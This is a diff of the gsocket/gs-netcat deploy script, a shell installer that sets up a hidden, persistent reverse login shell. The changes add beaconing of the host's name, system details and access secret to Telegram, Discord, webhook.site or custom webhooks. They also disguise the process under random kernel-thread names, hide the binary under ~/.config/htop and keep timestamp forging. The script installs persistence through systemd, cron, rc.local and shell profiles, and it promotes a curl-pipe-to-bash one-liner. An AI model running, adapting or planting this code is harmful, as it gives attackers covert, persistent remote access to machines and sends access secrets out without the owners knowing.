@@ -5,20 +5,14 @@
 # See https://www.gsocket.io/deploy/ for examples.
 #
 # This script is typically invoked like this as root or non-root user:
-#   $ bash -c "$(curl -fsSL gsocket.io/x)"
+#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
 #
 # Connect
-#   $ S=MySecret bash -c "$(curl -fsSL goscket.io/x)""
+#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)""
 # Pre-set a secret:
-#   $ X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
+#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
 # Uninstall
-#   $ GS_UNDO=1 bash -c" $(curl -fsSL gsocket.io/x)"
-#
-# Steps taken:
-# 1. Download pre-compiled binary
-# 2. Create a new secret (random)
-# 3. Start gs-netcat as a interactive reverse login shell and hidden process
-# 4. Install gs-netcat and automatically start after reboot
+#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"
 #
 # Other variables:
 # GS_DEBUG=1
@@ -34,43 +28,129 @@
 # GS_NOSTART=1
 #       - Do not start gs-netcat (for testing purpose only)
 # GS_NOINST=1
-#		- Do not install backdoor
+#		- Do not install gsocket
 # GS_OSARCH=x86_64-alpine
 #       - Force architecutre to a specific package (for testing purpose only)
-# GS_PREFIX=path
+# GS_PREFIX=
 #		- Use 'path' instead of '/' (needed for packaging/testing)
-# GS_URL_BASE=https://github.com/hackerschoice/binary/raw/main/gsocket/bin/
+# GS_URL_BASE=https://gsocket.io
 #		- Specify URL of static binaries
+# GS_URL_BIN=
+#		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
 # GS_DSTDIR="/tmp/foobar/blah"
 #		- Specify custom installation directory
 # GS_HIDDEN_NAME="-bash"
-#       - Specify custom hidden name for process
+#       - Specify custom hidden name for process, default is [kcached]
+# GS_BIN_HIDDEN_NAME="gs-dbus"
+#       - Specify custom name for binary on filesystem (default is gs-dbus)
+#       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified.
+# GS_DL=wget
+#       - Command to use for download. =wget or =curl.
+# GS_TG_TOKEN=
+#       - Telegram Bot ID, =5794110125:AAFDNb...
+# GS_TG_CHATID=
+#       - Telegram Chat ID, =-8834838...
+# GS_DISCORD_KEY=
+#       - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
+# GS_WEBHOOK_KEY=
+#       - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
+# GS_WEBHOOK=
+#       - Generic webhook, ="https://foo.blah/log.php?s=\${GS_SECRET}"
+# GS_HOST=
+#       - IP or HOSTNAME of the GSRN-Server. Default is to use THC's infrastructure.
+#       - See https://github.com/hackerschoice/gsocket-relay
+# GS_PORT=
+#       - Port for the GSRN-Server. Default is 443.
 # TMPDIR=
 #       - Guess what...
 
 # Global Defines
-URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
-[[ -n "$GS_URL_BASE" ]] && URL_BASE="$GS_URL_BASE" # Use user supplied URL_BASE
-URL_DEPLOY="gsocket.io/x"
-# GS_VERSION=1.4.34
+URL_BASE_CDN="https://cdn.gsocket.io"
+URL_BASE_X="https://gsocket.io"
+[[ -n $GS_URL_BASE ]] && {
+	URL_BASE_CDN="${GS_URL_BASE}"
+	URL_BASE_X="${GS_URL_BASE}"
+}
+URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
+URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
+[[ -n $GS_URL_BIN ]] && {
+	URL_BIN="${GS_URL_BIN}"
+	URL_BIN_FULL="$URL_BIN"
+}
+[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/x"
+
+# STUBS for deploy_server.sh to fill out:
+gs_deploy_webhook=
+GS_WEBHOOK_404_OK=
+[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
+unset gs_deploy_webhook
+
+# WEBHOOKS are executed after a successfull install
+# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
+msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
+### Telegram
+# GS_TG_TOKEN="5794110125:AAFDNb..."
+# GS_TG_CHATID="-8834838..."
+[[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
+	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
+	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
+}
+### Generic URL as webhook (any URL)
+[[ -n $GS_WEBHOOK ]] && {
+	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
+	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
+}
+### webhook.site
+# GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
+[[ -n $GS_WEBHOOK_KEY ]] && {
+	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
+	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
+}
+### discord webhook
+# GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
+[[ -n $GS_DISCORD_KEY ]] && {
+	data='{"username": "gsocket", "content": "'"${msg}"'"}'
+	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+}
+unset data
+unset msg
+
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
-# DL_CMD="$DL_CRL"
-BIN_HIDDEN_NAME_DEFAULT=gs-dbus
-# Can not use '[kcached/0]'. Bash without bashrc would use "/0] $" as prompt. 
-PROC_HIDDEN_NAME_DEFAULT="[kcached]"
-CY="\033[1;33m" # yellow
-CG="\033[1;32m" # green
-CR="\033[1;31m" # red
-CDR="\033[0;31m" # red
-CC="\033[1;36m" # cyan
-CM="\033[1;35m" # magenta
-CN="\033[0m"    # none
-CW="\033[1;37m"
+BIN_HIDDEN_NAME_DEFAULT="defunct"
+# Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
+proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
+# Pick a process name at random
+PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
+for str in "${proc_name_arr[@]}"; do
+	PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+done
+PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 
-# arr=()
-# arr+=("-r" "/etc/foobar.txt")
-# echo touch "${arr[@]}"
+# PROC_HIDDEN_NAME_DEFAULT="[rcu_preempt]"
+# ~/.config/<NAME>
+CONFIG_DIR_NAME="htop"
+
+# Names for 'uninstall' (including names from previous versions)
+BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
+CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")
+
+[[ -t 1 ]] && {
+	CY="\033[1;33m" # yellow
+	CDY="\033[0;33m" # yellow
+	CG="\033[1;32m" # green
+	CR="\033[1;31m" # red
+	CDR="\033[0;31m" # red
+	CB="\033[1;34m" # blue
+	CC="\033[1;36m" # cyan
+	CDC="\033[0;36m" # cyan
+	CM="\033[1;35m" # magenta
+	CN="\033[0m"    # none
+	CW="\033[1;37m"
+}
 
 if [[ -z "$GS_DEBUG" ]]; then
 	DEBUGF(){ :;}
@@ -158,8 +238,6 @@ ts_is_marked()
 	return 1 # False
 }
 
-
-
 # There are some files which need TimeStamp update after all other TimeStamps
 # have been fixed. Noteable /etc/systemd/system/multi-user.target.wants
 # ts_add_last [file] <reference file>
@@ -213,6 +291,7 @@ _ts_get_ts()
 	[[ -e "$fn" ]] && _ts_ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" && return
 
 	# Take ts from oldest file in directory
+	# shellcheck disable=SC2012 #Use find instead of ls => not portable
 	oldest="${pdir}/$(ls -atr "${pdir}" 2>/dev/null | head -n1)"
 	_ts_ts="$(date -r "$oldest" +%Y%m%d%H%M.%S 2>/dev/null)"
 }
@@ -362,7 +441,8 @@ xmv()
 	src="$1"
 	dst="$2"
 
-	xcp "$src" "$dst"
+	[[ -e "$dst" ]] && xrm "$dst"
+	xcp "$src" "$dst" || return
 	xrm "$src"
 	true
 }
@@ -386,16 +466,9 @@ exit_code()
 
 errexit()
 {
-	[[ -z "$1" ]] || echo -e 1>&2 "${CR}$*${CN}"
+	[[ -z "$1" ]] || echo -e >&2 "${CR}$*${CN}"
 
 	exit_code 255
-}
-
-# When all was successfull
-exit_alldone()
-{
-	echo 1>&1 "$*"
-	exit_code 0
 }
 
 # Test if directory can be used to store executeable
@@ -434,7 +507,7 @@ try_dstdir()
 	cp "$ebin" "$trybin" &>/dev/null || { rm -f "${trybin:?}"; return; }
 	chmod 700 "$trybin"
 
-	# Between 28th April and end of May we accidentially
+	# Between 28th April and end of May 2020 we accidentially
 	# over wrote /bin/true with gs-bd binary. Thus we use -g
 	# to make true, id and gs-bd return true (in case it's gs-bs).
 	"${trybin}" -g &>/dev/null || { rm -f "${trybin:?}"; return 104; } # FAILURE
@@ -459,7 +532,7 @@ init_dstbin()
 
 	# Try user installation
 	[[ ! -d "${GS_PREFIX}${HOME}/.config" ]] && xmkdir "${GS_PREFIX}${HOME}/.config"
-	try_dstdir "${GS_PREFIX}${HOME}/.config/dbus" && return
+	try_dstdir "${GS_PREFIX}${HOME}/.config/${CONFIG_DIR_NAME}" && return
 
 	# Try current working directory
 	try_dstdir "${PWD}" && { IS_DSTBIN_CWD=1; return; }
@@ -470,7 +543,7 @@ init_dstbin()
 	# Try /dev/shm as last resort
 	try_dstdir "/dev/shm" && { IS_DSTBIN_TMP=1; return; }
 
-	echo -e 1>&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
+	echo -e >&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
 	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
 	errexit
 }
@@ -522,6 +595,7 @@ init_vars()
 {
 	# Select binary
 	local arch
+	local osname
 	arch=$(uname -m)
 
 	if [[ -z "$HOME" ]]; then
@@ -533,6 +607,22 @@ init_vars()
 	# set PWD if not set
 	[[ -z "$PWD" ]] && PWD="$(pwd 2>/dev/null)"
 
+	[[ -z "$OSTYPE" ]] && {
+		local osname
+		osname="$(uname -s)"
+		if [[ "$osname" == *FreeBSD* ]]; then
+			OSTYPE="FreeBSD"
+		elif [[ "$osname" == *Darwin* ]]; then
+			OSTYPE="darwin22.0"
+		elif [[ "$osname" == *OpenBSD* ]]; then
+			OSTYPE="openbsd7.3"
+		elif [[ "$osname" == *Linux* ]]; then
+			OSTYPE="linux-gnu"
+		fi
+	}
+
+	unset OSARCH
+	unset SRC_PKG
 	# User supplied OSARCH
 	[[ -n "$GS_OSARCH" ]] && OSARCH="$GS_OSARCH"
 
@@ -540,35 +630,63 @@ init_vars()
 		if [[ $OSTYPE == *linux* ]]; then 
 			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
 				OSARCH="i386-alpine"
+				SRC_PKG="gs-netcat_mini-linux-i686"
+			elif [[ "$arch" == *"armv6"* ]]; then
+				OSARCH="arm-linux"
+				SRC_PKG="gs-netcat_mini-linux-armv6"
+			elif [[ "$arch" == *"armv7l" ]]; then
+				OSARCH="arm-linux"
+				SRC_PKG="gs-netcat_mini-linux-armv7l"
 			elif [[ "$arch" == *"armv"* ]]; then
 				OSARCH="arm-linux" # RPI-Zero / RPI 4b+
+				SRC_PKG="gs-netcat_mini-linux-arm"
 			elif [[ "$arch" == "aarch64" ]]; then
 				OSARCH="aarch64-linux"
+				SRC_PKG="gs-netcat_mini-linux-aarch64"
 			elif [[ "$arch" == "mips64" ]]; then
 				OSARCH="mips64-alpine"
+				SRC_PKG="gs-netcat_mini-linux-mips64"
 				# Go 32-bit if Little Endian even if 64bit arch
-				is_le && OSARCH="mipsel32-alpine"
+				is_le && {
+					OSARCH="mipsel32-alpine"
+					SRC_PKG="gs-netcat_mini-linux-mipsel"
+				}
 			elif [[ "$arch" == *mips* ]]; then
 				OSARCH="mips32-alpine"
-				is_le && OSARCH="mipsel32-alpine"
+				SRC_PKG="gs-netcat_mini-linux-mips32"
+				is_le && {
+					OSARCH="mipsel32-alpine"
+					SRC_PKG="gs-netcat_mini-linux-mipsel"
+				}
 			fi
 		elif [[ $OSTYPE == *darwin* ]]; then
 			if [[ "$arch" == "arm64" ]]; then
 				OSARCH="x86_64-osx" # M1
+				## FIXME: really needs M3 here..
+				SRC_PKG="gs-netcat_mini-macOS-x86_64"
 				# OSARCH="arm64-osx" # M1
 			else
 				OSARCH="x86_64-osx"
+				SRC_PKG="gs-netcat_mini-macOS-x86_64"
 			fi
-		elif [[ $OSTYPE == *FreeBSD* ]]; then
+		elif [[ ${OSTYPE,,} == *freebsd* ]]; then
 				OSARCH="x86_64-freebsd"
-		elif [[ $OSTYPE == *cygwin* ]]; then
+				SRC_PKG="gs-netcat_mini-freebsd-x86_64"
+		elif [[ ${OSTYPE,,} == *openbsd* ]]; then
+				OSARCH="x86_64-openbsd"
+				SRC_PKG="gs-netcat_mini-openbsd-x86_64"
+		elif [[ ${OSTYPE,,} == *cygwin* ]]; then
 			OSARCH="i686-cygwin"
 			[[ "$arch" == "x86_64" ]] && OSARCH="x86_64-cygwin"
 		# elif [[ $OSTYPE == *gnu* ]] && [[ "$(uname -v)" == *Hurd* ]]; then
 				# OSARCH="i386-hurd" # debian-hurd
 		fi
 
-		[[ -z "$OSARCH" ]] && OSARCH="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit
+		[[ -z "$OSARCH" ]] && {
+			# Default: Try Alpine(muscl libc) 64bit
+			OSARCH="x86_64-alpine"
+			SRC_PKG="gs-netcat_mini-linux-x86_64"
+		}
 	fi
 
 	# Docker does not set USER
@@ -579,7 +697,7 @@ init_vars()
 	try_encode "base64" "base64 -w0" "base64 -d"
 	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
 	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
-	SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
+	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
 
 	# OSX's pkill matches the hidden name and not the original binary name.
 	# Because we hide as '-bash' we can not use pkill all -bash.
@@ -611,10 +729,24 @@ init_vars()
 	}
 
 	# Defaults
-	BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
+	# Binary file is called gs-dbus or set to same name as Process name if
+	# GS_HIDDEN_NAME is set. Can be overwritten with GS_BIN_HIDDEN_NAME=
+	if [[ -n $GS_BIN_HIDDEN_NAME ]]; then
+		BIN_HIDDEN_NAME="${GS_BIN_HIDDEN_NAME}"
+		BIN_HIDDEN_NAME_RM+=("$GS_BIN_HIDDEN_NAME")
+	else
+		BIN_HIDDEN_NAME="${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
+	fi
+	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
 	
-	SEC_NAME="${BIN_HIDDEN_NAME_DEFAULT}.dat"
-	PROC_HIDDEN_NAME="${GS_HIDDEN_NAME:-$PROC_HIDDEN_NAME_DEFAULT}"
+	SEC_NAME="${BIN_HIDDEN_NAME}.dat"
+	if [[ -n $GS_HIDDEN_NAME ]]; then
+		PROC_HIDDEN_NAME="${GS_HIDDEN_NAME}"
+		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+	else
+		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
+	fi
+
 	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
 
 	RCLOCAL_DIR="${GS_PREFIX}/etc"
@@ -650,11 +782,53 @@ init_vars()
 	[[ ! -d "${CRONTAB_DIR}" ]] && CRONTAB_DIR="${GS_PREFIX}/etc/cron/crontabs"
 
 	local pids
-	pids="$(pgrep "${BIN_HIDDEN_NAME}" 2>/dev/null)"
-	# OSX's pgrep works on argv[0] proc-name
-	[[ -z $pids ]] && pids="$(pgrep "${PROC_HIDDEN_NAME//[^[:alnum:]]}" 2>/dev/null)"
+	# Linux 'pgrep kswapd0' would match _binary_ kswapd0 even if argv[0] is '[rcu_preempt]'
+	# and also matches kernel process '[kwapd0]'.
+	pids="$(pgrep "${BIN_HIDDEN_NAME_RX}" 2>/dev/null)"
+	# OSX's pgrep works on argv[0] proc-name:
+	[[ -z $pids ]] && pids="$(pgrep "(${PROC_HIDDEN_NAME_RX})" 2>/dev/null)"
 
 	[[ -n $pids ]] && OLD_PIDS="${pids//$'\n'/ }" # Convert multi line into single line
+	unset pids
+
+	# DL_CMD is used for help output of how to uninstall
+	if [[ -n "$GS_USELOCAL" ]]; then
+		DL_CMD="./deploy-all.sh"
+	elif command -v curl >/dev/null; then
+		DL_CMD="$DL_CRL"
+	elif command -v wget >/dev/null; then
+		DL_CMD="$DL_WGT"
+	else
+		# errexit "Need curl or wget."
+		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
+		errexit
+	fi
+
+	[[ $GS_DL == "wget" ]] && DL_CMD="$DL_WGT"
+	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
+	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
+		IS_USE_CURL=1
+		### Note: need -S (--show-errors) to process 404 for CF webhooks.
+		DL=("curl" "-fsSL" "--connect-timeout" "7" "-m900" "--retry" "3")
+		[[ -n $GS_DEBUG ]] && DL+=("-v")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("-k")
+	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
+		IS_USE_WGET=1
+		### Note: Dont use -q: Need errors to process 404 for CF webhooks
+		# Read-timeout is 900 seconds by default.
+		DL=("wget" "-O-" "--connect-timeout=7" "--dns-timeout=7")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")
+
+	else
+		DL=("false")   # Should not happen
+	fi
+
+	[[ $SHELL == *"nologin"* ]] && unset SHELL
+	[[ $SHELL == *"jail"* ]] && unset SHELL  # /usr/local/cpanel/bin/jailshell
+	[[ $SHELL == *"noshell"* ]] && unset SHELL  #  /usr/local/cpanel/bin/noshell
+	[[ $SHELL == *"/dev/null"* ]] && unset SHELL
+	# Test that shell is a good shell.
+	[[ -n $SHELL ]] && [[ "$("$SHELL" -c "echo TRUE" 2>/dev/null)" != "TRUE" ]] && unset SHELL
 
 	DEBUGF "OLD_PIDS='$OLD_PIDS'"
 	DEBUGF "SRC_PKG=$SRC_PKG"
@@ -734,7 +908,7 @@ uninstall_rm()
 	[[ -z "$1" ]] && return
 	[[ ! -f "$1" ]] && return # return if file does not exist
 
-	echo 1>&2 "Removing $1..."
+	echo "Removing $1..."
 	xrm "$1" 2>/dev/null || return
 }
 
@@ -743,9 +917,8 @@ uninstall_rmdir()
 	[[ -z "$1" ]] && return
 	[[ ! -d "$1" ]] && return # return if file does not exist
 
-	xrmdir "$1" 2>/dev/null || return
-
-	echo 1>&2 "Removing $1..."
+	echo "Removing $1..."
+	xrmdir "$1" 2>/dev/null
 }
 
 uninstall_rc()
@@ -761,7 +934,7 @@ uninstall_rc()
 
 	mk_file "$fn" || return
 
-	echo 1>&2 "Removing ${fn}..."
+	echo "Removing ${fn}..."
 	D="$(grep -v -F -- "${hname}" "$fn")"
 	echo "$D" >"${fn}" || return
 
@@ -792,88 +965,94 @@ uninstall_service()
 # Rather important function especially when testing and developing this...
 uninstall()
 {
+	local hn
+	local fn
+	local cn
+	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
+		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
+			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
+			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}.dat"  # SEC_NAME
+		done
+		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}"
+		uninstall_rm "/dev/shm/${hn}"
+		uninstall_rm "/tmp/.gsusr-${UID}/${hn}"
+		uninstall_rm "${PWD}/${hn}"
 
-	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${BIN_HIDDEN_NAME}"
-	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/gs-bd"
-	uninstall_rm "${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
-	uninstall_rm "${GS_PREFIX}/usr/bin/gs-bd"
-	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
-	uninstall_rm "/tmp/.gsusr-${UID}/${BIN_HIDDEN_NAME}"
+		uninstall_rm "${RCLOCAL_DIR}/${hn}.dat"  # SEC_NAME
+		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.dat" # SEC_NAME
 
-	uninstall_rm "${RCLOCAL_DIR}/${SEC_NAME}"
-	uninstall_rm "${RCLOCAL_DIR}/gs-bd.dat" #OLD
-	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${SEC_NAME}"
-	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/gs-bd.dat" #OLD
-	uninstall_rm "${GS_PREFIX}/usr/bin/${SEC_NAME}"
-	uninstall_rm "${GS_PREFIX}/usr/bin/gs-bd.dat" #OLD
-	uninstall_rm "/dev/shm/${SEC_NAME}"
-	uninstall_rm "/tmp/.gsusr-${UID}${SEC_NAME}"
+		uninstall_rm "/dev/shm/${hn}.dat" # SEC_NAME
+		uninstall_rm "/tmp/.gsusr-${UID}${hn}.dat" # SEC_NAME
 
-	uninstall_rmdir "${GS_PREFIX}${HOME}/.config/dbus"
+		uninstall_rm "${PWD}/${hn}.dat" # SEC_NAME
+
+		# Remove from login script
+		for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
+			uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "${hn}"
+		done 
+		uninstall_rc "${GS_PREFIX}/etc/rc.local" "${hn}"
+
+		uninstall_service "${SERVICE_DIR}" "${hn}" # SERVICE_HIDDEN_NAME
+
+		## Systemd's gs-dbus.dat
+		uninstall_rm "${SERVICE_DIR}/${hn}.dat"  # SYSTEMD_SEC_FILE / SEC_NAME
+	done
+
+	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
+		uninstall_rmdir "${GS_PREFIX}${HOME}/.config/${cn}"
+	done
 	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
 	uninstall_rmdir "/tmp/.gsusr-${UID}"
 
-	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
 	uninstall_rm "${TMPDIR}/${SRC_PKG}"
 	uninstall_rm "${TMPDIR}/._gs-netcat" # OLD
 	uninstall_rmdir "${TMPDIR}"
 
-	uninstall_rm "${PWD}/${BIN_HIDDEN_NAME}"
-	uninstall_rm "${PWD}/${SEC_NAME}"
-
-	# Remove from login script
-	for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
-		uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "${BIN_HIDDEN_NAME}"
-		uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "gs-bd" #OLD
-	done 
-	uninstall_rc "${GS_PREFIX}/etc/rc.local" "${BIN_HIDDEN_NAME}" 
-	uninstall_rc "${GS_PREFIX}/etc/rc.local" "gs-bd" #OLD
-
 	# Remove crontab
-	if [[ ! $OSTYPE == *darwin* ]]; then
-		if crontab -l 2>/dev/null | grep -F -e "$BIN_HIDDEN_NAME" -e "gs-bd" &>/dev/null; then
+	unset regex
+	regex="dummy-not-exist"
+	for str in "${BIN_HIDDEN_NAME_RM[@]}"; do
+		# Escape regular exp special characters
+		regex+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+	done
+	if [[ $OSTYPE != *darwin* ]] && command -v crontab >/dev/null; then
+		ct="$(crontab -l 2>/dev/null)"
+		[[ "$ct" =~ ($regex) ]] && {
 			[[ $UID -eq 0 ]] && mk_file "${CRONTAB_DIR}/root"
-			command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v -F -- "${BIN_HIDDEN_NAME}" | grep -v -F -- "gs-bd" | crontab - 2>/dev/null
-		fi
+			echo "$ct" | grep -v -E -- "($regex)" | crontab - 2>/dev/null
+		}
 	fi
 
-	# Remove systemd service
-	uninstall_service "${SERVICE_DIR}" "${SERVICE_HIDDEN_NAME}"
-	uninstall_service "/etc/systemd/system" "gs-bd" #OLD
-	systemctl daemon-reload 2>/dev/null
+	[[ $UID -eq 0 ]] && systemctl daemon-reload 2>/dev/null
 
-	## Systemd's gs-dbus.dat
-	uninstall_rm "${SYSTEMD_SEC_FILE}"
-	uninstall_rm "/etc/systemd/system/gs-bd.dat" #OLD
-
-	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
-	echo -e 1>&2 "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${systemd_kill_cmd}${CN} to terminate all running shells."
+	echo -e "${CG}Uninstall complete.${CN}"
+	echo -e "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${systemd_kill_cmd}${CN} to terminate all running shells."
 	exit_code 0
 }
 
 SKIP_OUT()
 {
-	echo -e 1>&2 "[${CY}SKIPPING${CN}]"
-	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
+	echo -e "[${CY}SKIPPING${CN}]"
+	[[ -n "$1" ]] && echo -e "--> $*"
 }
 
 OK_OUT()
 {
-	echo -e 1>&2 "......[${CG}OK${CN}]"
-	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
+	echo -e "......[${CG}OK${CN}]"
+	[[ -n "$1" ]] && echo -e "--> $*"
 }
 
 FAIL_OUT()
 {
-	echo -e 1>&2 "..[${CR}FAILED${CN}]"
+	echo -e "..[${CR}FAILED${CN}]"
 	for str in "$@"; do
-		echo -e 1>&2 "--> $str"
+		echo -e "--> $str"
 	done
 }
 
 WARN()
 {
-	echo -e 1>&2 "--> ${CY}WARNING: ${CN}$*"
+	echo -e "--> ${CY}WARNING: ${CN}$*"
 }
 
 WARN_EXECFAIL_SET()
@@ -885,15 +1064,24 @@ WARN_EXECFAIL_SET()
 WARN_EXECFAIL()
 {
 	[[ -z "$WARN_EXECFAIL_MSG" ]] && return
-	echo -e 1>&2 "--> Please send this output to ${CC}members@thc.org${CN} to get it fixed."
-	echo -e 1>&2 "--> ${WARN_EXECFAIL_MSG}"
+	[[ -n "$ERR_LOG" ]] && echo -e "${CDR}${ERR_LOG}${CN}"
+	echo -en "${CDR}"
+	ls -al "${DSTBIN}"
+	echo -e "${CN}--> ${WARN_EXECFAIL_MSG}
+--> GS_OSARCH=${OSARCH}
+--> ${CDC}GS_DSTDIR=${DSTBIN%/*}${CN}
+--> Try to set ${CDC}export GS_DEBUG=1${CN} and deploy again.
+--> Please send that output to ${CM}root@proton.thc.org${CN} to get it fixed.
+--> Alternatively, try the static binary from
+--> ${CB}https://github.com/hackerschoice/gsocket/releases${CN}
+--> ${CDC}chmod 755 gs-netcat; ./gs-netcat -ilv${CN}."
 }
 
 HOWTO_CONNECT_OUT()
 {
 	# After all install attempts output help how to uninstall
-	echo -e 1>&2 "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
-	echo -e 1>&2 "--> To connect use one of the following:
+	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+	echo -e "--> To connect use one of the following:
 --> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
 --> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
 --> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
@@ -945,6 +1133,7 @@ install_system_systemd()
 
 	# Create the service file
 	mk_file "${SERVICE_FILE}" || return
+	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
 	echo "[Unit]
 Description=D-Bus System Connection Bus
 After=network.target
@@ -952,7 +1141,7 @@ After=network.target
 [Service]
 Type=simple
 Restart=always
-RestartSec=10
+RestartSec=300
 WorkingDirectory=/root
 ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
 
@@ -1013,7 +1202,7 @@ install_system_rclocal()
 
 install_system()
 {
